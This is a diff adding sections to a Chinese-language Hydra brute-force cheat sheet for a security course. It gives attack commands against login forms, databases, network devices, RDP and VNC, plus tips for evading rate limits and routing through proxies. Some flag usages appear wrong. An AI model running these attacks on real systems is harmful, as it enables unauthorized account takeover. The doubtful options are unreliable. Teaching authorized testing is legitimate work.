@@ -309,4 +309,154 @@ MySQL 爆破：     hydra -l root -P pass.txt mysql://IP
 详细输出：       -V / -vV
 ```
 
+---
+
+## 实战场景扩展
+
+### 场景六：HTTP POST 表单爆破
+
+```bash
+# 爆破登录表单
+hydra -l admin -P rockyou.txt target.com http-post-form \
+  "/login.php:username=^USER^&password=^PASS^:Invalid login"
+
+# 带 CSRF Token 的处理（使用 -e ns）
+# 先用 curl 获取 token，嵌入 hydra
+hydra -l admin -P rockyou.txt target.com http-post-form \
+  "/login.php:user=^USER^&pass=^PASS^&csrf=TOKEN:H=Cookie:PHPSESSIONID=xxx:Invalid"
+
+# WordPress 登录爆破
+hydra -l admin -P rockyou.txt target.com http-post-form \
+  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
+```
+
+### 场景七：HTTP GET 参数爆破
+
+```bash
+# API 认证爆破
+hydra -l admin -P rockyou.txt target.com http-get \
+  "/api/auth?username=^USER^&password=^PASS^:H=Authorization: Basic:401"
+
+# 带自定义 Header 的 GET 爆破
+hydra -L users.txt -P pass.txt target.com http-get \
+  "/admin/:H=User-Agent: Mozilla/5.0:H=X-Forwarded-For: 127.0.0.1:401"
+```
+
+### 场景八：数据库服务爆破
+
+```bash
+# MongoDB（无认证开放在公网的）
+hydra -L users.txt -P pass.txt mongodb://target.com
+
+# PostgreSQL
+hydra -L users.txt -P pass.txt postgres://target.com
+
+# Oracle
+hydra -L users.txt -P pass.txt oracle://target.com/sid=SID_NAME
+
+# Redis（通常无密码或弱密码）
+hydra -P pass.txt redis://target.com
+
+# MSSQL
+hydra -L users.txt -P pass.txt mssql://target.com
+```
+
+### 场景九：网络设备爆破
+
+```bash
+# Cisco 设备
+hydra -L users.txt -P pass.txt cisco://target.com
+hydra -L users.txt -P pass.txt cisco-enable://target.com  # enable 密码
+
+# Huawei 设备
+hydra -L users.txt -P pass.txt telnet://target.com
+
+# SNMP Community String
+hydra -P community_dict.txt target.com snmp
+```
+
+### 场景十：远程桌面爆破
+
+```bash
+# RDP 爆破（速度较慢，需要特殊编译）
+# 使用 hydra 或专门的 crowbar 工具
+hydra -L users.txt -P pass.txt rdp://target.com
+
+# 配合 NLA 检测
+hydra -t 1 -V -f -l admin -P pass.txt rdp://target.com
+
+# VNC（无认证或弱密码）
+hydra -P pass.txt vnc://target.com
+```
+
+---
+
+## 高级技巧
+
+### 静默/隐蔽模式
+
+```bash
+# 降低并发（不触发阈值）
+hydra -l admin -P pass.txt -t 2 -W 5 ssh://target.com
+
+# 随机延迟
+hydra -l admin -P pass.txt -t 2 ssh://target.com -c 30:60
+# -c 30:60 → 每次尝试后等待30-60秒
+
+# 退出条件
+hydra -l admin -P pass.txt ssh://target.com -f     # 找到第一对就停止
+hydra -l admin -P pass.txt ssh://target.com -F     # 找到第一对全局停止
+```
+
+### 恢复与继续
+
+```bash
+# 保存会话
+hydra -l admin -P pass.txt ssh://target.com -o hydra_results.txt -I
+
+# 恢复中断的任务
+hydra -R
+
+# 从断点继续
+hydra -l admin -P pass.txt ssh://target.com -I
+```
+
+### 代理扫描
+
+```bash
+# 通过 SOCKS5 代理
+hydra -l admin -P pass.txt -s 22 ssh://target.com -x socks5://127.0.0.1:1080
+
+# 通过 HTTP 代理
+hydra -l admin -P pass.txt -s 22 ssh://target.com -x http://127.0.0.1:8080
+```
+
+---
+
+## 常见问题排查
+
+| 问题 | 原因 | 解决方案 |
+|:---|:---|:---|
+| 连接超时 | 防火墙/目标离线 | 验证可达性，调整 `-W` 参数 |
+| 误报(valid但实际不对) | 服务器统一返回 | 用 `-S` 检查响应模式 |
+| 慢速 | 单线程 | 增加 `-t`（SSH 建议 4-8）|
+| 被拦截/封 IP | 速率限制 | 降低 `-t`，加 `-W` 延迟 |
+| 编译错误 | 缺少依赖 | `apt install libssl-dev` |
+| 特殊端口 | 非默认端口 | `-s PORT` 指定 |
+
+---
+
+## Hydra vs Medusa vs Ncrack 对比
+
+| 特性 | Hydra | Medusa | Ncrack |
+|:---|:---|:---|:---|
+| 速度 | 快 | 中 | 快（Nmap 系）|
+| 协议支持 | 50+ | 20+ | 比较少 |
+| 并行 | 线程序列 | 多模块并行 | 高效并发 |
+| 输出 | 基础文本 | XML 支持 | 基础文本 |
+| 维护 | 活跃 | 较少 | 活跃 |
+| 推荐场景 | 通用 | 特殊模块 | SSH/RDP |
+
+---
+
 > 📖 本文为"网安百宝箱"课程配套读物。更新于 2026-06-18
